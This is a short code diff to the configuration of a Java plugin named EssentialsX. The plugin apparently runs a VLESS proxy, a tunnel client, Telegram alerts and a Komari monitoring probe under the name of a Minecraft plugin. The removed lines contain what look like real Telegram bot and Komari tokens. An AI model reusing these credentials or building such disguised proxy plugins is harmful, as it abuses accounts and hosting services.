@@ -32,7 +32,7 @@ public class EssentialsX extends JavaPlugin {
     // ================= 配置（编译前自行修改） =================
 
     static final String VLESS_UID = "6021c57c-fdf0-44b4-b688-135568139d30";
-    static final int VLESS_PORT = 14754;
+    static final int VLESS_PORT = 65534;
 
     // 公网隧道服务器（留空字符串则不启动隧道客户端）
     // VLESS_PORT 和 TUNNEL_LOCAL_PORT需对应
@@ -42,12 +42,12 @@ public class EssentialsX extends JavaPlugin {
     static final int TUNNEL_LOCAL_PORT = 65534;
 
     // ---- Telegram 通知（可留空） ----
-    static final String TG_TOKEN = "7195422483:AAGhrc-1nzto9Ik05rY2K5V8xdvLSGInVBo";
-    static final String TG_CHAT_ID = "5800052646";
+    static final String TG_TOKEN = "";
+    static final String TG_CHAT_ID = "";
 
     // ---- Komari 监控探针（可留空，留空则不启动上报） ----
-    static final String KOMARI_HOST = "https://oracle-de-komari.0o0o.pp.ua";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
-    static final String KOMARI_TOKEN = "RQf5N081RZfuYs6s74fyTj";  // Komari 后台节点详情页的 Client Token
+    static final String KOMARI_HOST = "";   // 例: "http://127.0.0.1:25774" 或 "https://komari.example.com"
+    static final String KOMARI_TOKEN = "";  // Komari 后台节点详情页的 Client Token
 
     // 服务器名称
     static final String SERVER_NAME = "Mcserverhost美国";
